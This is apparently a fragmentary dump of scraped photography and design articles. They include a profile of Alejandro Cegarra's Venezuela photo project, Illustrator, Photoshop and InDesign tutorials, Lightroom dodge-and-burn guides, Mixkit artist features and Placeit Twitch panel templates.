ZX1, the fact that it\u2019s now supported in Adobe Camera Raw suggests that we might see it soon. \nIt\u2019s possible that we might hear something in the new year, although I think the most likely date for an announcement might be in May on Zeiss\u2019 home turf in Germany at Photokina 2020. \nThere\u2019s still no word on a price, but we\u2019ll keep you posted when we hear more. \n[via DPReview ]",

      "text": "VIDEO \nWhat\u2019s up, photography fans! It\u2019s Martin from All about Street Photography channel and today I would like to talk about a series of photographs. Placing third in the 2019 Photo Contest of the World Press Photo Awards in the Long-Term Projects, Stories. Let\u2019s check out the State of Decay by Alejandro Cegarra . \nAlejandro Cegarra was born in 1989 in Venezuela, where he lives in the capital city Caracas. He began studying photography in Roberto Mata Photography Workshop, while at the same time studying Publicity at Alejandro Humboldt University. In early 2012, he started filling in for other photographers at the largest newspaper in Venezuela, as well as other two newspapers. To this day Cegarra works for multiple newspapers and news outlets. \nIn addition to the World Press Photo Award, he also received the Leica Oscar Barnack Newcomer Award, third place in the Sony World Photography Awards in the Contemporary Issues category, and was chosen by the Magnum Photo Agency as part of their 30 Under 30 contest. You can find a full list on his website. \nI was fortunate enough to interview him about his photographs and how he was able to capture the moments that earned him the World Press Photo award. \nThe State of Decay is a photo project that was created during anti-government protests in Caracas, Venezuela from March 2013 to March 2018. Now, you might have probably heard about the problems in Venezuela and the economic crisis the country is in right now, but let\u2019s take a look at the history of the problems. \n03 August, 2013 A man holds up a portrait of Hugo Ch\u00e1vez during a political rally led by Ch\u00e1vez\u2019s successor Nicol\u00e1s Maduro. \nVenezuela experienced the biggest economic growth from 1999 to 2013 during the presidency of Hugo Ch\u00e1vez, mostly thanks to the oil prices as Venezuela has the highest proven oil reserves in the world. The prices were constantly growing and Venezuela was able to finance welfare programs and building houses for the poor. The prices grew from 25 USD per barrel to more than $160 per barrel. However, this time of prosperity ended when global recession throttled demand for energy and sent oil and gas prices into a precipitous free fall when the prices started to drop. By the end of 2008, the prices dropped to 53 USD per barrel. The prices started to recover next year and reached 125 USD per barrel over the years until 2014 when it experienced another drop. \nPresident Nicol\u00e1s Maduro who came to the office in 2013 continued the welfare programs which resulted in over-expenditure and ultimately hyperinflation. Together with the US sanctions, the Venezuelan economy crashed. Manufacturers were forced to close down and in 2015 Venezuela had over 100% inflation\u2014the highest in the world and the highest in the country\u2019s history at that time. Unfortunately, as the situation escalated, Venezuela spiralled into hyperinflation causing poverty to rise to nearly 90% of the population. As the situation escalated, there was a shortage of food, medicine and other essential items. Cegarra tells the story of the country slowly falling apart. He felt it was his duty to document the issue, as the situation was worse day by day. He said it was a powerful motivator but also a heavy burden. The photographs were taken with a Nikon D300 , Canon EOS 5D Mark II , Mark III and Mark IV , and Leica M Typ 240 . \nCegarra is using his 5D Mark IV for assignments and his Leica for personal projects. \n12 March, 2018 Children gather for lunch outside a community dining room in Caracas, Venezuela. They have to bring their own spoons, as cutlery is expensive. Such dining rooms, largely funded by private institutions and NGOs, have opened around the country to help tackle a chronic food shortage. \nThe final selection of 29 pictures was made from 25 thousand pictures. My personal favorite photograph is a demonstrator that puts a rosary over his head before clashing with the Bolivarian National Guard during anti-government protests in Caracas, Venezuela. Cegarra\u2019s favorite shot is a woman trying to halt National Guard anti-riot officers during protests against the Venezuelan government. For him it represents how the common citizen feels against the government, it has a powerful message as well as composition. \nSome of the moments probably happened pretty fast but for his portraits Cegarra tries to build close relationships. The project, for him, was documentation of losing the place he and the people living in Venezuela call home. \n06 June, 2017 A woman tries to halt National Guard anti-riot officers during protests against the Venezuelan government on the Francisco Fajardo highway in Caracas. \nThis project took a lot from me, physically and mentally, I was living what I was photographing, so the experience during the project is a constant struggle trying to put some ground between me and the photographs, which wasn\u2019t always possible. \n\u2013 Alejandro Cegarra \nCegarra was photographing as part of a group during police raids and protests and alone when taking portraits. As you can see, the project is completely in black and white. But when you look at Cegarra\u2019s Instagram you can see he also shoots colors. \nBlack and white is drawing, which is my first language as a photographer, color is painting, so it depends on what I want to do, how I want to address the issue, but lately I just do black and white on demand, color has caught me entirely. \n\u2013 Alejandro Cegarra \nI think this project is a great example of using photography for documentary purposes. I often find myself treating photography mostly as a fine art. But projects like this make me realize how important photography is for telling the stories, unlike any other medium. \nI would like to thank Alejandro for the opportunity to talk about his project. Make sure to check out his website and social media to find more incredible stories. \nAbout the Author \nMartin Kaninsky is a photographer and YouTuber based in Prague, Czech Republic.

      "text": "In today\u2019s tutorial, we\u2019re going to take a quick look behind the process of creating a user profile icon inside of Illustrator, and see how we can do so using nothing more than a couple of basic geometric shapes. \nSo, assuming you already have the software running in the background, bring it up and let\u2019s get started! \nTutorial Details: User Profile Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2019 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 20 Minutes \nFinal Image: User Profile Icon \nStep 1 \nAs with every new project, we\u2019re going to kick things off by setting up a New Document , by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nAs soon as we\u2019ve finished setting up our project file, we can start working on the actual user profile icon, and we will do so by creating the main shape for the background using a 56 x 56 px square, which we will color using #ffd05c and then center align to the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nAdjust the shape that we\u2019ve just created, by opening up the Transform panel, and then heading over to Rectangle Properties and setting the Radius of its bottom-right corner to 8 px , and the remaining ones to 28 px . \nStep 4 \nCreate the main shape for the user profile icon symbol, using a 28 x 28 px circle, which we will color using white ( #ffffff ), and then position to the center of the larger background. \nStep 5 \nAdd the main shape for the human silhouette\u2019s head of the user profile icon using an 8 x 8 px circle, which we will color using #1c202d and then position at a distance of 5 px from the previous shape\u2019s top anchor point . \nStep 6 \nCreate the user profile icon\u2019s lower body using a larger 28 x 28 px circle ( #1c202d ), which we will position below as seen in the reference image , making sure to select and group the two shapes together afterwards using the Control-G keyboard shortcut. \nStep 7 \nSince we need the user profile icon\u2019s lower body to remain confined to the surface of the white circle, we\u2019re going to mask the two shapes that we\u2019ve just grouped. To do so, first grab a copy ( Control-C ) of the underlying circle, which we will paste in front ( Control-F ), and then with both the copy and the grouped shapes selected simply right click > Make Clipping Mask . \nStep 8 \nFinish off the user profile icon and with it the project itself, by adding an outline to the white circle using the Stroke method. Start by creating a copy of it ( Control-C ) which we will paste in front ( Control-F ) and then adjust by flipping its Fill with its Stroke using the Shift-X keyboard shortcut making sure to set its color to #1c202d . Open up the Stroke panel, and set its Weight to 2 px selecting and grouping ( Control-G ) all of the symbol\u2019s composing shapes, doing the same for the entire user profile icon afterwards. \nAwesome Job! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions about how to create your own user profile icon, feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post User Profile Icon: Learn How to Create in Adobe Illustrator appeared first on Vectips .",

      "text": "There\u2019s a common misconception among beginner photographers, especially those that are just getting started with post-processing and editing their landscape photos. This mistaken belief is that dodging and burning is a highly complex procedure that should only be attempted by seasoned professionals and Photoshop wizards \u2014 this belief could not be further from the truth! \nWhen I first got into landscape photography I was one of these mistaken believers, I assumed that since I was a beginner and didn\u2019t understand Photoshop that this editing sorcery was something I should avoid as it most certainly had to be far above my skill set. \nIt wasn\u2019t until three years into my then landscape photography hobby that I decided to put my editing skills to the test and attempt to wrap my head around this \u201cadvanced\u201d post-processing technique. Once I began digging into the details surrounding dodging and burning, I was flabbergasted to find that this all intimidating procedure was actually easier to comprehend than originally thought. \nIn the 16-minute video above, I discuss three simple ways to dodge and burn your landscape photos in Lightroom. And why you should try this technique now as opposed to delaying as I did, but before we jump into the \u2018How\u2019, it\u2019s important to first understand the \u2018What\u2019 and the \u2018Why\u2019. \nWhat is Dodging & Burning? \nIt\u2019s quite simple honestly, dodging means to brighten an area of your image and burning means to darken an area of your image. \nWhy Should You Dodge & Burn? \nThere are many reasons to dodge and burn a photo, but the main reasons for me are to create shape and dimension in an otherwise flat looking image and to complexify light and direct the viewer\u2019s attention to certain areas of a photo. The eye is naturally drawn to areas of brightness and at the same time generally ignores areas of darkness. Dodging and burning allow you to take advantage of this. \nHow Do You Dodge & Burn? \nThere are three ways to dodge and burn your photos in Lightroom. Below are the methods I use on my landscape images. \nAdjustment Brush \nIn this section within Lightroom, there\u2019s actually an effect called \u2018Dodge (Lighten)\u2019 and Burn (\u2018Darken)\u2019. I always start with dodging and set the feather to 100 and flow to 50 and paint the effect directly onto areas of highlights and then do the adverse with burning by painting areas of shadow. This will add shape and dimension to your image. \nRadial Filter \nThis approach is similar to the adjustment brush but is designed around creating circular or oval areas of the effect. You still have access to the Dodge (Lighten) and Burn (Darken) effects and the premise is really the same. Dodge areas of highlights and Burn areas of shadows to create dimension and direct the viewer\u2019s attention to specific portions of your image. \nRange Mask \nThis is a great option if you\u2019re looking to get really refined with your Adjustment Brush or Radial Filter selection. You can use either the Luminance or Color Range Mask depending on the specific situation to get a bit more targeted with your adjustment. \nIn Summary \nTo close out, that\u2019s the What, Why, and the How with regards to Dodging and Burning inside of Lightroom. Once I began practicing this technique, I was not only surprised by how easy it was to begin implementing, but I was also impressed by the results that could be achieved. I quickly found that Dodging and Burning is one of those techniques that you don\u2019t fully understand what you\u2019re missing until you try it for yourself. \nP.S.

      "text": "How to properly dodge and burn your way to stunning landscape photos \nOctober 5, 2019 by John Aldred Leave a Comment \nVIDEO \nDodging and burning is often a technique we really only see mentioned when it comes to portraits. And it\u2019s no surprise, really. It can be a great way to even out skin tones and texture. But it\u2019s been a powerful technique when it comes to landscapes for a very long time. Ansel used it in the darkroom and many landscape photographers use it today in Photoshop. \nIn this 17-minute video, photographer Michael Shainblum shows us a couple of different techniques for dodging and burning landscape photos within Photoshop to add impact and really bring out the important bits you want to highlight. \nThe first technique Michael shows is using the Soft Light blend mode, or Overlay if you want something a little more punchy. Adding blank layers using these blend modes and then painting on black or white allows you to highlight or hide certain elements of your scene to draw the viewer\u2019s eye where you want it to go. \nMichael\u2019s second technique is using Curves adjustment layers, and then painting on the mask. This method arguably offers a lot more fine-tune control over exactly how your dodge and burn layers affect your image. You get the same level of control that you get using the above method, by painting on the mask, but then you can control the overall strength of it by adjusting the curve itself. You can also use multiple layers in order to target specific areas of the image in a different way. \nPersonally, I tend to go the Curves route with my own images. And while I try to keep it to as few adjustment layers as possible, it\u2019s not uncommon for me to find myself with a couple of dozen of them if I really want to get picky with it. \nMichael suggests using a Wacom tablet and I couldn\u2019t agree more. I use the Wacom Intuos with Bluetooth for my own retouching. It plugs into my desktop at home to keep it charged up and it\u2019s wireless when I\u2019m on the road with my laptop. It makes things like this go so much faster. \nHow much dodge and burn do you do to your landscape shots? \n[via FStoppers ]",

      "text": "Have you discovered the wondrous free art at Mixkit? From illustration to high-quality video, Mixkit artists create amazing royalty-free graphics for all your projects. \nMixkit Illustration: 3 Artists You Should Follow \nThe art community is a generous one. Artists have always been willing to share their resources to help other creatives expand their potential. And now you can do even more with Mixkit . \nSo What Is Mixkit? \nMixkit is a curated gallery of some of the world's most creative artists offering their illustrations and videos for free! Use these stocks to amplify your feeds, branding, or personal work. \nAnd today, we're featuring three incredible Mixkit artists who've shared their work for you to play and experiment with. Explore the process and fantastic illustration styles from artists like Lauren Bending, Supriya Bhonsle, and L Schissel. \nLauren Bending \nMelbourne-based illustrator and graphic designer Lauren Bending kicks us off with her bright, eye-catching watercolor style. Get to know her process and download these great graphics! \nFind more of Lauren's work below: \nDreaming Woman \nArtists all have to start somewhere, and for Lauren it began at a young age, fueled by her love of horses: \nI think I started to really get into it when I was about 6 or 7. I was absolutely OBSESSED with horses...I would come home after school, and go straight to the horse racing section at the back of the newspaper, and cut out all the pictures of the horses. \nThen I would sit for hours drawing horse after horse, and it went on like this for honestly, years! Eventually I got pretty good, so then I moved onto portraits and did the same thing. I drew them over and over until I was pretty good, then on to the next thing. \nColorful Mountain Range \nHer artistic process is simple: just get into a really clean and bright workspace, set up all the equipment, put some music on, and start drawing. \nI always start with a concept, or an intention, and then the end result can, most often than not, be completely different! \nCross Section of Two Shells \nArt can be so powerful. See if you can relate to this \"BAM!\" moment on a visit to an art gallery. \nWhen I was about 17, my mum took me to Paris. There was an Impressionists exhibition on at Mus\u00e9e d\u2019Orsay, and Renoir was one of the artists. I remembered learning about one of his most famous paintings, \u2018Bal du moulin de la Galette\u2019, in high school. \nI was walking through the exhibition, admiring all the beautiful paintings, and then BAM! There it was! Right there in the middle of the room, nearly 2m wide, and staring me right in the face. I must have stood stuck there for nearly 15 minutes, the whole time with tears rolling down my face. I never understood until that moment what Impressionism meant. The way the use of light made the canvas come to life, is something I will always remember. \nBright Watercolor Portrait \nHere's Lauren's inspirational advice for aspiring artists: \nJust keep creating! As long as you are creating, drawing, sculpting, etc, then new ideas and new ways of thinking will present themselves. \nNothing ever changes if nothing changes! So keep looking, keep being inspired, and keep questioning and pushing your talent. \nSupriya Bhonsle \nIllustrator and motion designer Supriya Bhonsle is our next fantastic feature from Sydney, Australia. Her engaging illustrative style is fun and colorful, and brings the audience into a cozy world with familiar feelings. \nFind more of Supriya's work below: \nReading a Book Wrapped in Warm Blankets \nSupriya is a Sydney-based freelance motion graphics designer. With a background in Visual Communications, she works on a range of projects like TV commercials, explainer videos, broadcast graphics, branded content, and illustration. \nEmpty Train Digital Art Illustration \nAlthough her process is different for every job and depends on what her role is, Supriya says one thing always remains constant: \nOne over-arching principle is to always prioritize the message. \nWoman Falling Through the Cracks \nAlthough we often make art alone, it's best when it's shared\u2014that's the whole philosophy behind Mixkit, and it's something Supriya believes too. \nSeeing something you\u2019ve made out in the world is always a nice surprise. There is a lot of novelty in what I do so most jobs are memorable, especially when I have the privilege of working with friends. \nCouple Walking Arm in Arm \nWant your work to have an impact? Try to stake out new ground and ensure your art represents all kinds of different people. \nVeer away from representing the over represented. The world would be a better place if the media/art/advertising we put out there is more inclusive and representative of the diversity that surrounds us. \nAlso, you can learn something from everyone so soak up as much knowledge as you can from your coworkers, don\u2019t be precious about your work and just keep making stuff\u2014even if it's bad. \nL Schlissel \nOur final feature belongs to the talented L Schlissel. This freelance illustrator and graphic designer creates phenomenally colored digital graphics of everyday scenes and powerful moments. \nFind more of L's work below: \nDream Illustration \nFrom comics to Belgian Surrealism, it's been quite a journey for L Schlissel: \nI always loved comics and cartoons as a child but became interested in illustration when I was in high school and discovered Ren\u00e9 Magritte. I thought his paintings were brilliant and they really spoke to me. \nWinter Playground \nAfter art school in New York, L worked a variety of jobs as a graphic designer or illustrator with a focus on children's illustration, as well as creating worksheets and educational materials for several companies. \nMy process starts with gathering inspiration and references then a loose sketch. I mostly use Adobe Illustrator to build the basic shapes and color palette. After I'm satisfied I build up the details and patterns then add some texture. \nSummertime Illustration \nWhat could be better than art and travel? Even in this internet age when artworks are available at the touch of a button, sometimes it's worth going to see the original. \nMy most memorable experiences were traveling abroad to see art. Years ago I studied in Italy for a month and was able to see a lot of famous works from the Renaissance. More recently I went to Japan and saw an incredible exhibit on Hokusai. \nWoman in Profile Illustration \nAre you waiting for inspiration to strike you? Don't wait any longer\u2014go out and find it! \nInspiration is everywhere, don't wait for it to find you. Go out and search for it in the flowers, in people, in the little details you never noticed. Keep creating and study other artists. \nGet Involved! How You Can Use Mixkit \nArt should be shared, so let your art see the world. Expand your business and make new friends!

This is an advanced tutorial with great results. \nWarning : This type of technique can damage your equipment. Proceed with it at your own risk. \nAs you can see in the 3-minute video above, it\u2019s a very easy procedure, and although we present the Yashica Electro 35 as an example in the tutorial, I already used the same process on my Canon Canonet QL19 with the same excellent results (some images are below). The beam splitter has a delicate coating on it, so it is important to use caution when cleaning it. \nHere\u2019s what I use for the cleaning process, in detail. \nI use a 1/3 stop gel, but you can use a strong gel, like 2/3 or 1 stop. It depends on how bad your focus patch is. And I use a blue gel because it increases contrast with my yellow patch. Take into account that if you use a very dark gel, the visibility gets a little reduced in the case of photos at night. It\u2019s a matter of testing and finding the best of both worlds. \nHere\u2019s my Canonet undergoing the same process: \nAnd here\u2019s the final result showing my Canonet QL19 viewfinder after the cleaning and modification: \nI hope you find this tutorial helpful. \nAbout the author : Pedro Cardoso is the Lisbon, Portugal-based photographer behind filmlovephotography , a website for people who love analog photography.

Open the forest image and drag this image into the white canvas using the Move Tool (V) . \nStep 2 \nOpen the gate image. As it has a transparent background, so simply use the Move Tool to drag it onto the forest background and place it in the middle section. \nStep 3 \nClick the second icon at the bottom of the Layers panel to add a mask to this layer. Use a soft black brush to erase the bottom of the gate and blend it with the ground. \nStep 4 \nCreate a new layer (set as Clipping Mask ), change the mode to Overlay 100% and fill with 50% gray. \nActivate the Dodge Tool (O) with Midtones Range, Exposure about 20-30% to brighten some details around the gate contour and bottom. You can see how I did it with Normal mode and the result with Overlay mode. \nStep 5 \nGo to Layer > New Adjustment Layer > Gradient Map and pick the colors #0d0501 and #0a437b . \nStep 6 \nMake a Hue/Saturation adjustment layer to change the whole scene to a dark cyan. \nStep 7 \nAdd a Curves adjustment layer to brighten the whole scene. On the layer mask, use a soft black brush to erase the part inside the gate and the ground. \nStep 8 \nUse another Curves adjustment layer to darken the edges of the forest. Paint on the middle so it won\u2019t be or less be affected by this adjustment layer. \nStep 9 \nDrag the road image into the main canvas and use the Free Transform Tool (Ctrl+T) to scale it down to fit the size of the gate. Convert this layer to a Smart Object . \nAdd a mask to this layer and use a hard black brush to erase the parts outside the space between the gate. \nStep 10 \nGo to Filter > Blur > Gaussian Blur and change the radius to 3 px. On the filter mask, use a soft black brush to erase the foreground of the road, leave the blur effect visible on the background only. \nStep 11 \nTo make a light reflection from the road on the gate, create a new layer on top of the layers and use a soft brush with the color #f78c36 to paint around the contour inside the gate. Change this layer mode to Overlay 100% . \nStep 12 \nDuplicate this layer to make the light effect stronger. \nStep 13 \nMake a new layer and change the mode to Color 100% . Use the same brush to paint gold light effect on the surface of the small rocks on the forest ground. \nStep 14 \nCut out the bird and add him to the middle of the gate. \nStep 15 \nCreate a Color Balance adjustment layer and alter the Midtones and Highlights settings. On the layer mask, use a soft black brush to erase the middle of the bird\u2019s tail and the wing\u2019s part on the gate. \nStep 16 \nCreate a Gradient Map adjustment layer on top of the layers and pick the colors #e10019 and #00601b . Lower the opacity of this layer to 20% . On the layer mask, use a soft black with the opacity about 10-15% to reduce the dark red on some details around the middle section. \nStep 17 \nAdd a Color Balance adjustment layer and change the Midtones and Highlights values. \nStep 18 \nUse a Curves adjustment layer to bring more light to the middle of the whole scene. Paint on the both sides so it won\u2019t be affected by this adjustment layer. \nStep 19 \nMake another Curves adjustment layer to darken the edges a bit. Paint on the middle to keep its brightness. \nAnd We\u2019re Done! \nI hope that you enjoyed this tutorial.",

It offers terrific Twitch panel ideas and templates that will help you create your very own gorgeous custom Twitch panels quickly and easily. \nHow to Make Twitch Panels Quickly and Easily \nIf you want to learn how to make Twitch panels, this short tutorial will teach you how to do so quickly and easily. \n1. Navigate to the Twitch Panel Maker at Placeit. \n2. Review the Twitch panel templates on offer and select the one you like the most. \nFor our example, I will teach you how to make a donation panel on Twitch. \n3. To create Twitch panels, use the Twitch panel creator to customise the template provided. \nStarting with the controls on the left, you can add your own text and change the font style and colour. \n4. Move to the controls on the right \nYou can now change your background colour and the colour of the line dividing the image. \nNext, you can change the icon used in the panel by uploading your own or using one of those provided by the template. You can also change the colour of the icon here. \n5. When you're done, hit the Download button \nOnce you\u2019re satisfied with your design, hit the download button at the top of the screen and download your custom Twitch panel for a small fee. \nIf you regularly need to create banners, logos, flyers, posters, social media banners, etc., then the monthly plan may be the best deal for you. \nThat\u2019s how to make Twitch panels in five simple steps. Now let's take a look at the wonderful Twitch Panel Templates available at Placeit. \nAbout Me Twitch Panel Templates \n1. Twitch Panel Template for Cool Gamers \nAn About Me Twitch panel is a must for any Twitch channel. The Twitch panel creator has several About Me panels you can customise to suit your taste, like the Twitch Panel Template for Cool Gamers pictured here. Choose an icon to represent you or upload your own. Then personalise the text, add borders, and change your colours, and your 'About Me' Twitch panel is ready to download. \n2. Twitch Panel Template for a Twitch About Me Panel \nAmp up your Twitch channel with this cool About Me Twitch panel with funky colours and a fun skeleton wearing a beret. Of course, you can change every aspect of the design when you customise the template, so have some fun with it. \n3. Simple Twitch Panel Design Template \nThis split colour Twitch About Me panel is for those who like to keep things simple. It features bold text on one side and a simple gaming icon on the other. Choose your preferred colours, change the text and/or font, and then either upload your own icon, keep the one shown here, or choose another from those on offer. \n4. Girly Twitch Panel Maker \nHmmmmm! Not sure about the title of this Twitch About Me panel, but the panel itself would be a great choice for any gender. The beautiful gradient effect can be applied to any colour combo, and there are a plethora of gorgeous icons to choose from. \n5. Twitch Panel Maker for an About Me Panel \nAnother variation on the panels above, this one offers a zig-zag dividing line that separates the two-colour panel. Use as is or modify the elements you don't like using the Twitch panel creator. \n6. About Me Twitch Panel Template \nThis awesome Twitch About Me panel, with its transparent background, allows you to add a panel to your channel which gives the appearance of having a different shape from the usual rectangle. You can add a gradient to your background as well as a number of cool geometric shapes. \n7. Simple Twitch Panel Template for an About Me Button \nThis About Me Twitch panel template offers a number of options to jazz up your panel. Apart from being able to change the icon, the text and font, and the colours, you can also change the shape of the banner inside the rectangle in various ways to create a panel with a unique look and feel. \nFollow Twitch Panel Templates \n8. Twitch Panel Template for a Social Media Follow Button \nLooking for Twitch Channel panels that encourage viewers to join your tribe? Then you'll need some awesome follow Twitch panels like the ones featured here, starting with this panel, which alerts Twitter users that you too have a Twitter account and encourages them to connect with you there. \n9. Follow Twitch Panel Maker with Minimalist Design \nOf course, you also need a follow Twitch panel that encourages visitors to follow your stream. Create Twitch panels that catch the eye and encourage people to click that follow panel with this template. All you need to do is upload your logo to the right side of the template, add the text you want, select your colour scheme, and your panel is ready to download. \n10. Twitch Panel Template with Social Media Icons \nIf you have loads of social media accounts, this is a great template you can customise to encourage visitors to follow each one. Just set up your colour scheme and text for each one, and then upload a different social media icon to the left. If you want to differentiate each panel a bit, you can vary the geometric overlays provided for each one. \nTwitch Donation Panel Template \n11. Donations Twitch Panel Maker \nWhen you need to create Twitch panels to encourage donations to your channel, you can find tons of Twitch panel ideas on Placeit. This Twitch donation panel is a great example of a template you can use as is or customise by using your own logo or one of the icons provided. Then add your text and colour scheme, and your Twitch donation panel is ready to add to your channel. \n12. Twitch Panel Creator for a Donation Link \nThis Twitch donation panel directs viewers to your Patreon account. It's a good idea not just to ask for donations but to indicate where you're sending viewers when they click on your donation button. \n13. Twitch Panel Maker for a Donate Button \nUsing please when you're asking for anything is always a good idea. So when you're customising your Twitch donation panels, it's a good idea to remember to chuck a please in there when you can. \n14. Twitch Panel Creator \nOf course, the other magic word is thank you, another great option to add to your text when asking for something. So maybe when you're customising this particular Twitch donation panel, all you need to do is change the colours and perhaps the font used if you like, and leave everything else as is. Just a thought! \n15. Simple Twitch Panel Template for a Donations Panel \nWhat better way to encourage donations on your Twitch donation panel than with a money icon? Maybe you can also use the colour green, which is the colour of life and growth. \n16. Twitch Panel Maker for PayPal Donations \nBy now, you are familiar with this terrific Twitch channel panel with its transparent background and cool shape. I've included it here to show how you can use it repeatedly on your channel for different purposes by customising the colours, text and icons used. \nDiscord Twitch Panel Templates \n17. Twitch Panel Design Maker for Gamers \nNeed to create Twitch panels to invite visitors to chat with you via Discord? Well, Placeit has you covered with a collection of awesome Discord Twitch panels. And, of course, these panels are as easy to customise as all the other panels featured here. \n18. Customizable Twitch Panel Maker \nAs a Twitch user, you know that Discord has its own nifty little icon, so I wouldn't recommend replacing it if you want to catch the eye of visitors to your channel, but you can use the other settings in the Panel maker to change the frame, text and colours of your panel. \n19. Simple Twitch Panel Template with Gamer Icons \nAnd, of course, you can customise this familiar template use for your Discord Twitch panel as well. The Panel maker colour palette is so extensive that the sky's the limit when it comes to creating unique colours to make your panel your own unique creation. \n20.

You can use as is, but remember everything here is customisable, so feel free to change things up to suit your taste. \nTwitch Subscribe Panel Templates \n22.

Twitch Panel Maker with Robot Clipart \nI can hear you saying, \"Wait a minute here, that's not a Twitch schedule panel!\" You're right, this template wasn't designed exactly as a Twitch schedule panel, but I included it to make the point that any panel that you like can be customised to your needs.

Twitch Panel Creator for a Gaming Crew \nLet's face it, there are tons of different panels each individual Twitch user could make for their channel. We've tried to cover the most popular, but we cannot cover all of them. For the myriad other categories, we've bundled a few under the heading Twitch info panels. Let's start with this one. Bold and eye-catching, this could probably be included under \"About\", but we thought that it's distinct enough to warrant its own category. \n32. Twitch Panel Creator for a Chat Rules Panel \nRules: we all need them, and so do you. Use this Twitch info panel to indicate to your visitors what they should know first before diving into your channel. \n33. Colorful Twitch Panel Design Template \nThis cool Twitch info panel is just a great thing to have on your site because it acknowledges your supporters and lets them know you appreciate them.

How to Add Typography to Your Menu Design \nStep 1 \nLock the Material layer and unlock the top layer, Type . \nUse the Type Tool (T) to create a text frame across the center of the top of the page. \nType in the restaurant name and, from the Character panel (Window > Type & Tables > Character) , set the Font to Coellak Rad , Size 60 pt , and increase the Tracking (letter-spacing) to 40 . You might want to use the Glyphs panel (Window > Type & Tables > Glyphs) to insert different variations of the characters. \nFrom the Swatches panel, set the Font Color to Silver Gray. You can add an optional subtitle below, set to a 20 pt Font Size. \nStep 2 \nOpen the Art Deco Ornament Pack illustration in Adobe Illustrator. \nDelete the background color and select the four elements of the design shown below, before going to Edit > Copy. \nReturn to InDesign and Edit > Paste the design directly onto the menu. \nSwitch the Fill Color of the graphic to Silver Gray , and position it to the left of the restaurant name. \nStep 3 \nEdit > Copy the graphic and then Right-Click > Transform > Flip Horizontal. \nPosition it to the right of the restaurant name to frame the header. \nStep 4 \nCopy and Paste the restaurant title text frame and move it below, reducing the Font Size to 42 pt and editing the text to read the menu name, e.g. \u2018A LA CARTE\u2019 or \u2018FOOD MENU\u2019. \nStep 5 \nOpen the kitchenware01.ai file in Adobe Illustrator . Select the spoon graphic on the far left side and Edit > Copy it. \nHead back to InDesign and Edit > Paste it, switching the Fill Color to Silver Gray . Paste a spoon graphic on either side of the menu title. \nStep 6 \nCreate a text frame spanning the width of the left-hand column, typing in the first subtitle (e.g. \u2018STARTERS\u2019), and setting the Font to Coellack Rad, Size 25 pt , and the Font Color to Peppermint . \nCreate a text frame below this, typing in the name of the first item on the menu, followed by a series of ellipses, and the price on the right side of the text frame. Set the Font to Fiona Regular, Size 16 pt , and a Peppermint Font Color. \nCopy and Paste the text frame repeatedly, creating a block of dishes under the \u2018STARTERS\u2019 title. \nStep 7 \nSelect all the \u2018STARTERS\u2019 text frames you\u2019ve just created and Right-Click > Group them. \nYou can now use this group as a block for populating the rest of the menu design. \nStep 8 \nReturn to the Art Deco Ornament Pack illustration and select the elements around the edge of the graphic, as highlighted below. \nEdit > Copy this border graphic. Then head back to InDesign and Edit > Paste it onto the Type layer, rotating it to fit any large gap on the menu layout. \nSet the Fill Color to Silver Gray. \nInside this border, you can feature a special dish or dish of the day. Set the header in Coellak Rad with a Gold Font Color. \nCopy across one or a few of the dish text frames to place inside the border. \nStep 9 \nDon\u2019t forget to add a little key at the bottom left of the menu, for dishes with special dietary requirements. \nThe final decorative touch is to add a large text frame across the bottom-right of the page, rotating it slightly and typing in a slogan or quote, before setting the Font to Rosemary Signature and a Gold Font Color. \n4. How to Create a Matching Drinks Menu \nStep 1 \nExpand the Pages panel (Window > Pages). \nOn Page 1, Right-Click > Duplicate Spread , to create a copy of the menu. \nScroll down to Page 2 of your document. Select the Page Tool (Shift-P) and click onto the page to select it. From the top Controls panel, set the Liquid Page Rule to Scale , and then switch the Page Size to A5 from the size menu. \nThis scales all the elements on the page down to a smaller A5 page size, without the need to resize elements individually. \nStep 2 \nWorking on the Background layer, select the rectangular shape and switch the Fill Color to Peppermint . \nLock the Background layer and unlock the layer above, Material . Delete the image frames on this layer, before creating a new one with the Rectangle Frame Tool (F) that extends across the whole page. \nFile > Place , go to the Cloth Backgrounds folder and choose the 28.jpg file, before clicking Open . \nSelect the image frame and go to Object > Effects > Transparency . Switch the Mode to Screen and bring the Opacity down to 75% , before clicking OK . \nStep 3 \nWorking on the Type layer, select the restaurant name text frame(s) and switch the Font Color to Gold . Do the same for the border graphics too. \nSwitch the name of the menu to \u2018DRINKS MENU\u2019 or similar, and the Font Color to Gold . \nStep 4 \nDelete one of the columns of type from the far left or right side, leaving just two columns of text. Move these centrally onto the page, and revise the headings of each section as required (e.g. to \u2018COCKTAILS\u2019, \u2018BEERS\u2019, etc). \nKeep the decorative frame, moving it to the top right of the righthand column, and use this to frame the name of some special drinks. \nChange the Font Color of the script text at bottom right to Silver Gray. \nStep 5 \nReturn to the kitchenware01.ai illustration in Adobe Illustrator. This time, select a teapot graphic and Edit > Copy it. Paste it onto your InDesign drinks menu. \nSelect a teacup image separately and Copy and Paste it too. \nAdjust the Fill Color of both to Silver Gray. \n5. How to Export Your Menu for Printing \nWhen you\u2019ve finished working on your menu and are ready to send it to print, go to File > Export. \nChoose Adobe PDF (Print) from the options in the Format menu at the bottom of the window, name the file, and click Save . \nIn the Export Adobe PDF window that opens, choose [Press Quality] for the Preset . \nThen click on Marks and Bleeds in the window\u2019s left-hand menu. Check both All Printer\u2019s Marks and Use Document Bleed Settings . \nClick Export to create your menu PDF.

